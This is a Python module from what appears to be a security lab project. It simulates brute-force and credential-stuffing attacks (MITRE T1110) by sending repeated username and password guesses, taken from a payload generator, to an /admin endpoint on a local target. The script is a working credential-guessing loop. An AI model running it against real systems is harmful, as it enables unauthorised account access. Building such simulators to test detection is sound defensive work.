"""
attack_lab/scenarios/brute_force.py
=====================================
Brute Force / Credential Stuffing Simulator
MITRE: T1110
"""
import time, random, logging, urllib.request, urllib.parse, urllib.error
import sys, os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))
from attack_lab.utils.payload_generator import PayloadGenerator
log = logging.getLogger("sentinel.attack_lab.brute")

def run(target="127.0.0.1", port=5001, count=50, delay=0.2, verbose=True):
    base = f"http://{target}:{port}"
    pg = PayloadGenerator()
    results = {"attempts": 0, "errors": 0}
    if verbose:
        log.info(f"[BruteForce] Starting → {base}/admin | {count} attempts")
    for _ in range(count):
        user, pwd = pg.get_credentials()
        url = f"{base}/admin?username={urllib.parse.quote(user)}&password={urllib.parse.quote(pwd)}"
        try:
            urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "BruteBot/1.0"}), timeout=2)
            results["attempts"] += 1
        except urllib.error.HTTPError:
            results["attempts"] += 1
        except Exception as e:
            results["errors"] += 1
        time.sleep(delay)
    if verbose:
        log.info(f"[BruteForce] Done: {results['attempts']} attempts")
    return results
